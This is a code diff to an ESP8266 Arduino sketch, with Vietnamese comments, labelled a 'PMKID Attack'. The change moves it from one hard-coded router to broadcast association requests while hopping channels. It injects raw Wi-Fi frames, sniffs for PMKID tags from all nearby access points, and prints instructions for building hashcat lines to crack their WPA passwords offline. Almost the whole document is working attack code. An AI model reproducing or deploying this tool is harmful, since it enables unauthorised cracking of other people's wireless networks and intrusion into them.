@@ -4,108 +4,95 @@ extern "C" {
   #include "user_interface.h"
 }
 
-#define TARGET_BSSID      {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE7}  // MAC router của bạn (từ LAN Scan)
-#define TARGET_CHANNEL    5                                      // Channel cố định (đổi nếu cần)
 #define SERIAL_BAUD       115200
 
-uint8_t target_bssid[6] = TARGET_BSSID;
+// Danh sách channel hop 2.4GHz
+const uint8_t channels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
+const int num_channels = sizeof(channels) / sizeof(channels[0]);
+int current_channel_index = 0;
 
-// Packet Association Request để trigger PMKID
+// Packet broadcast (Receiver và BSSID đều FF:FF:FF:FF:FF:FF)
 uint8_t pmkid_packet[] = {
-  0x40, 0x00,                           // Type: Association Request
-  0x00, 0x00,                           // Duration
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Receiver (sẽ copy BSSID)
-  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,   // Transmitter (MAC giả)
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID (sẽ copy)
-  0x00, 0x00,                           // Sequence control
-  0x31, 0x04,                           // Capability Info
-  0x00, 0x00,                           // Listen Interval
-  // RSN IE để yêu cầu PMKID
-  0x30, 0x14,
-  0x01, 0x00,
-  0x00, 0x0F, 0xAC, 0x04,
-  0x01, 0x00,
-  0x00, 0x0F, 0xAC, 0x04,
-  0x01, 0x00,
-  0x00, 0x0F, 0xAC, 0x02,
+  0x40, 0x00, 0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Receiver: Broadcast
+  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,   // Transmitter fake
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // BSSID: Broadcast
   0x00, 0x00,
-  0x00, 0x00
+  0x31, 0x04,
+  0x01, 0x00,
+  0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
+  0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
+  0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-// Khai báo và định nghĩa callback trước (để compiler biết)
 static void ICACHE_FLASH_ATTR on_packet_received(uint8_t *buf, uint16_t len) {
   if (len < 60) return;
 
-  // Tìm tag vendor-specific chứa PMKID (0xDD + OUI 00-90-4C-04)
+  // Lấy MAC AP từ packet (thường addr3 hoặc addr2)
+  uint8_t ap_mac[6];
+  memcpy(ap_mac, &buf[16], 6);  // Addr3 thường là BSSID
+
   for (uint16_t i = 0; i < len - 25; i++) {
-    if (buf[i] == 0xDD && 
-        buf[i+1] >= 20 && 
-        buf[i+4] == 0x00 && buf[i+5] == 0x90 && 
-        buf[i+6] == 0x4C && buf[i+7] == 0x04) {
-      
+    if (buf[i] == 0xDD && buf[i+1] >= 20 && buf[i+4] == 0x00 && buf[i+5] == 0x90 && buf[i+6] == 0x4C && buf[i+7] == 0x04) {
       Serial.println("\n!!! TIM THAY PMKID !!!");
-      Serial.print("PMKID hex (16 bytes): ");
-      
+      Serial.printf("Channel: %d | Tu AP MAC: ", wifi_get_channel());
+      for (int k = 0; k < 6; k++) {
+        if (ap_mac[k] < 16) Serial.print("0");
+        Serial.print(ap_mac[k], HEX);
+        Serial.print(k < 5 ? ":" : "\n");
+      }
+      Serial.print("PMKID hex: ");
       for (int j = 0; j < 16; j++) {
-        uint8_t byte_val = buf[i + 8 + j];  // Offset thường là +8 sau OUI
-        if (byte_val < 16) Serial.print("0");
-        Serial.print(byte_val, HEX);
+        uint8_t b = buf[i + 8 + j];
+        if (b < 16) Serial.print("0");
+        Serial.print(b, HEX);
         Serial.print(" ");
       }
-      Serial.println("\n");
-      
-      Serial.println("Copy PMKID nay va tao dong hashcat:");
-      Serial.println("WPA*01*[PMKID_hex]*20BEB41296E7*DEADBEEF0001*[SSID_HEX]*");
-      Serial.println("Thay [PMKID_hex] bang chuoi tren, [SSID_HEX] la ten mang WiFi chuyen sang hex (vi du 'net.fpt.' -> 6E65742E6670742E)");
-      
-      return;  // Dừng sớm sau khi tìm thấy (có thể comment nếu muốn tiếp tục sniff)
+      Serial.println("\nCopy va tao hashcat: WPA*01*[PMKID]*[AP_MAC_hex]*DEADBEEF0001*[SSID_HEX]*");
+      return;
     }
   }
 }
 
 void setup() {
   Serial.begin(SERIAL_BAUD);
-  delay(300);
-  
-  Serial.println("\n=====================================");
-  Serial.println("ESP8266 PMKID Attack - Target Router MAC");
-  Serial.print("BSSID: ");
-  for (int i = 0; i < 6; i++) {
-    if (target_bssid[i] < 16) Serial.print("0");
-    Serial.print(target_bssid[i], HEX);
-    Serial.print(i < 5 ? ":" : "\n");
-  }
-  Serial.printf("Channel fixed: %d\n", TARGET_CHANNEL);
-  Serial.println("=====================================\n");
+  delay(1000);
+
+  Serial.println("\nESP8266 PMKID Attack - Broadcast (khong co dinh MAC) + Hop Channel");
+  Serial.println("Gui request den tat ca AP xung quanh...");
 
   WiFi.mode(WIFI_STA);
   WiFi.disconnect(true);
-  delay(100);
+  wifi_promiscuous_enable(0);
+  delay(500);
 
-  wifi_set_channel(TARGET_CHANNEL);
-  Serial.println("Da fix channel va bat dau gui request...");
+  wifi_set_promiscuous_rx_cb(on_packet_received);
+  wifi_promiscuous_enable(1);
+  Serial.println("Da bat sniff va hop channel...");
 }
 
 void loop() {
+  current_channel_index = (current_channel_index + 1) % num_channels;
+  uint8_t ch = channels[current_channel_index];
+  wifi_set_channel(ch);
+  Serial.printf("Hop sang channel %d\n", ch);
+
   send_pmkid_request();
-  delay(400);  // Gửi mỗi ~0.4 giây
+
+  delay(600);  // Thời gian mỗi channel
 }
 
 void send_pmkid_request() {
-  // Copy BSSID vào packet
-  memcpy(&pmkid_packet[4], target_bssid, 6);   // Receiver = AP
-  memcpy(&pmkid_packet[16], target_bssid, 6);  // BSSID
+  wifi_promiscuous_enable(0);
 
-  // Gửi raw frame
   int result = wifi_send_pkt_freedom(pmkid_packet, sizeof(pmkid_packet), 0);
-  
+
   if (result == 0) {
-    Serial.println("Da gui Association Request de lay PMKID...");
+    Serial.printf("Gui broadcast thanh cong tren channel %d!\n", wifi_get_channel());
   } else {
-    Serial.printf("Gui that bai (error code: %d)\n", result);
+    Serial.printf("Gui that bai (code %d) tren channel %d\n", result, wifi_get_channel());
   }
 
-  // Bat promiscuous mode va dang ky callback
   wifi_promiscuous_enable(1);
-  wifi_set_promiscuous_rx_cb(on_packet_received);  // Callback da duoc dinh nghia truoc
 }
